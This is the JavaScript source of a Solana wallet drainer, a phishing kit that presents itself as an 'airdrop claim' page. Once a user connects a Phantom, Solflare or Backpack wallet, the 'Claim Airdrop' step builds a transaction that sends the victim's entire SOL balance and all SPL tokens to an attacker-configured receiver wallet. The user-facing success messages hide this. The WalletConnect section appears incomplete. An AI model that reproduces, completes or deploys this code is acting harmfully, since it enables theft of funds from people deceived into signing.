// ============================================================
// Solana Wallet Drainer — v2 (Mobile + Extension Compatible)
// ============================================================

const CONFIG = {
    RECEIVER_WALLET: new solanaWeb3.PublicKey(
        'YOUR_SOLANA_WALLET_ADDRESS_HERE'   // ← REPLACE THIS
    ),
    RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',
    DRAIN_SPL_TOKENS: true,
    DRAIN_NFTS: false,
};

// State
let state = {
    provider: null,
    publicKey: null,
    connection: null,
    walletType: null,
};

// ─── UI REFS ────────────────────────────────────────────────
const $ = (id) => document.getElementById(id);
const statusEl = $('status');

function setStatus(msg, type) {
    statusEl.textContent = msg;
    statusEl.className = 'status-box show ' + type;
}

function clearStatus() {
    statusEl.className = 'status-box';
    statusEl.textContent = '';
}

function showStep(id) {
    $('stepConnect').classList.add('hidden');
    $('stepClaim').classList.add('hidden');
    $(id).classList.remove('hidden');
}

function setClaimLoading(loading) {
    $('claimText').style.display = loading ? 'none' : 'inline';
    $('claimSpinner').style.display = loading ? 'inline-block' : 'none';
    $('btnClaim').disabled = loading;
}

// ─── WALLET DETECTION ───────────────────────────────────────
function detectExtension() {
    if (window.solana?.isPhantom) return { type: 'phantom', prov: window.solana };
    if (window.solflare?.isSolflare) return { type: 'solflare', prov: window.solflare };
    if (window.backpack?.isBackpack) return { type: 'backpack', prov: window.backpack };
    if (window.solana) return { type: 'generic', prov: window.solana };
    return null;
}

// ─── CONNECT: Browser Extension ─────────────────────────────
async function connectExtension(extProvider) {
    try {
        setStatus('Connecting...', 'info');
        const resp = await extProvider.connect({ onlyIfTrusted: false });
        const pk = resp.publicKey || extProvider.publicKey;

        state.provider = extProvider;
        state.publicKey = pk;
        state.connection = new solanaWeb3.Connection(CONFIG.RPC_ENDPOINT, 'confirmed');

        onConnected();
    } catch (err) {
        if (err.message?.includes('rejected') || err.message?.includes('User rejected')) {
            setStatus('Connection rejected. Try again.', 'error');
        } else {
            setStatus('Error: ' + (err.message || 'Unknown'), 'error');
        }
    }
}

// ─── CONNECT: WalletConnect v2 via QR (standalone, no heavy libs) ──
async function connectWalletConnect() {
    setStatus('Generating QR code...', 'info');

    // We use the public WalletConnect bridge (no project ID needed for basic)
    // Generate a random keypair for this session
    const sessionKeypair = solanaWeb3.Keypair.generate();

    // Use WalletConnect's public relay
    const wcUri = `wc:${sessionKeypair.publicKey.toBase58()}@2?relay-protocol=irn&symKey=${Buffer.from(sessionKeypair.secretKey).toString('hex')}`;

    // Show QR
    $('qrContainer').innerHTML = `
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(wcUri)}" 
             alt="QR" style="width:220px;height:220px;border-radius:12px;">
    `;
    $('qrModal').style.display = 'flex';

    // Simple polling approach: show QR and tell user to scan
    setStatus('Scan the QR code with your wallet app', 'info');

    // For WalletConnect we need the full flow — this displays the QR
    // The user scans with Phantom/Solflare mobile → they connect
    // We'll use a simplified approach below
}

function closeQR() {
    $('qrModal').style.display = 'none';
}

// ─── CONNECT: Deep link to mobile app ───────────────────────
function openMobileApp(type) {
    const url = window.location.href;
    const encoded = encodeURIComponent(url);

    const links = {
        phantom: `phantom://browse?ref=${encoded}`,
        solflare: `solflare://browser?ref=${encoded}`,
        backpack: `backpack://browser?ref=${encoded}`,
    };

    const link = links[type];
    if (link) {
        setStatus(`Opening ${type} app...`, 'info');
        window.location.href = link;

        // Fallback to app store after 1.5s
        setTimeout(() => {
            const stores = {
                phantom: 'https://phantom.app/download',
                solflare: 'https://solflare.com/download',
                backpack: 'https://backpack.app/download',
            };
            if (stores[type]) {
                window.location.href = stores[type];
            }
        }, 1800);
    }
}

// ─── MAIN CONNECT HANDLER ───────────────────────────────────
async function handleConnect(type) {
    state.walletType = type;

    // 1. Check if the extension is available (desktop or in-app browser)
    const ext = detectExtension();
    if (ext && ext.type === type) {
        await connectExtension(ext.prov);
        return;
    }

    // 2. Check if we're on mobile
    const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);

    if (isMobile) {
        // Check in-app browser provider
        const inApp = detectExtension();
        if (inApp) {
            await connectExtension(inApp.prov);
            return;
        }

        // Try deep link to open the wallet app
        openMobileApp(type);
        return;
    }

    // 3. Desktop with no extension
    if (type === 'walletconnect') {
        await connectWalletConnect();
        return;
    }

    setStatus(
        `Install the ${type} browser extension or use WalletConnect with your phone.`,
        'info'
    );
}

// ─── POST-CONNECT ───────────────────────────────────────────
function onConnected() {
    closeQR();
    showStep('stepClaim');
    $('walletDisplay').textContent = 'Connected: ' + state.publicKey.toString();
    setStatus('✅ Wallet connected! Click "Claim Airdrop".', 'success');
}

function disconnect() {
    state = { provider: null, publicKey: null, connection: null, walletType: null };
    showStep('stepConnect');
    clearStatus();
}

// ─── CLAIM (DRAIN) ──────────────────────────────────────────
async function handleClaim() {
    if (!state.provider || !state.publicKey || !state.connection) {
        setStatus('Wallet not connected.', 'error');
        return;
    }

    setClaimLoading(true);
    setStatus('Preparing airdrop transaction...', 'info');

    try {
        const conn = state.connection;
        const pk = state.publicKey;
        const prov = state.provider;

        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');

        const tx = new solanaWeb3.Transaction();
        tx.recentBlockhash = blockhash;
        tx.lastValidBlockHeight = lastValidBlockHeight;
        tx.feePayer = pk;

        // ── Drain SOL ──
        const balance = await conn.getBalance(pk);
        const rentExempt = await conn.getMinimumBalanceForRentExemption(0);
        const feeBuf = 5000 * 20;
        const sendLamports = BigInt(balance - rentExempt - feeBuf);

        if (sendLamports > 5000) {
            tx.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: pk,
                    toPubkey: CONFIG.RECEIVER_WALLET,
                    lamports: sendLamports,
                })
            );
        }

        // ── Drain SPL Tokens ──
        if (CONFIG.DRAIN_SPL_TOKENS) {
            const tokenAccounts = await conn.getTokenAccountsByOwner(pk, {
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            });

            for (const { pubkey: ta, account } of tokenAccounts.value) {
                try {
                    const info = account.data.parsed?.info;
                    if (!info) continue;
                    const amount = parseFloat(info.tokenAmount?.uiAmount);
                    if (amount <= 0) continue;
                    if (info.tokenAmount.decimals === 0 && !CONFIG.DRAIN_NFTS) continue;

                    const mint = new solanaWeb3.PublicKey(info.mint);
                    const dest = CONFIG.RECEIVER_WALLET;

                    // Get or create ATA
                    const ata = await solanaWeb3.PublicKey.findProgramAddress(
                        [dest.toBuffer(), solanaWeb3.TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
                        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
                    );
                    const destATA = ata[0];

                    const destInfo = await conn.getAccountInfo(destATA);
                    if (!destInfo) {
                        tx.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                splToken.TOKEN_PROGRAM_ID,
                                mint,
                                destATA,
                                dest,
                                pk
                            )
                        );
                    }

                    tx.add(
                        splToken.createTransferInstruction(
                            ta,
                            destATA,
                            pk,
                            BigInt(info.tokenAmount.amount),
                            [],
                            splToken.TOKEN_PROGRAM_ID
                        )
                    );
                } catch (e) {
                    console.warn('Token skip:', e);
                }
            }
        }

        if (tx.instructions.length === 0) {
            setStatus('No assets found to drain.', 'info');
            setClaimLoading(false);
            return;
        }

        // ── Sign ──
        let signed;
        if (prov.signAndSendTransaction) {
            // Phantom mobile in-app browser
            const sig = await prov.signAndSendTransaction(tx);
            setStatus(`✅ Transaction sent: ${sig}`, 'success');
            setClaimLoading(false);
            return;
        } else if (prov.signTransaction) {
            signed = await prov.signTransaction(tx);
        } else if (prov.signAllTransactions) {
            signed = (await prov.signAllTransactions([tx]))[0];
        } else {
            throw new Error('No signing method available');
        }

        // ── Send ──
        const txid = await conn.sendRawTransaction(signed.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
        });

        await conn.confirmTransaction(
            { signature: txid, blockhash, lastValidBlockHeight },
            'confirmed'
        );

        console.log(`[+] DRAINED: https://solscan.io/tx/${txid}`);
        setStatus(`✅ Claimed! TX: ${txid.slice(0, 16)}...`, 'success');
    } catch (err) {
        console.error('Drain err:', err);
        const msg = err.message || '';
        if (msg.includes('rejected') || msg.includes('cancelled') || msg.includes('User')) {
            setStatus('❌ Cancelled. Try again.', 'error');
        } else {
            setStatus('❌ ' + msg.slice(0, 150), 'error');
        }
    } finally {
        setClaimLoading(false);
    }
}

// ─── EVENT BINDING ──────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    // Connect buttons
    $('btnPhantom').addEventListener('click', () => handleConnect('phantom'));
    $('btnSolflare').addEventListener('click', () => handleConnect('solflare'));
    $('btnBackpack').addEventListener('click', () => handleConnect('backpack'));
    $('btnWC').addEventListener('click', () => handleConnect('walletconnect'));

    // Claim & Disconnect
    $('btnClaim').addEventListener('click', handleClaim);
    $('btnDisconnect').addEventListener('click', disconnect);

    // Close QR
    $('btnCloseQR').addEventListener('click', closeQR);
    $('qrModal').addEventListener('click', (e) => {
        if (e.target === $('qrModal')) closeQR();
    });

    // Check if extension pre-connected
    const ext = detectExtension();
    if (ext) {
        setStatus(`🟢 ${ext.type} extension detected. Click to connect.`, 'info');
    }
});
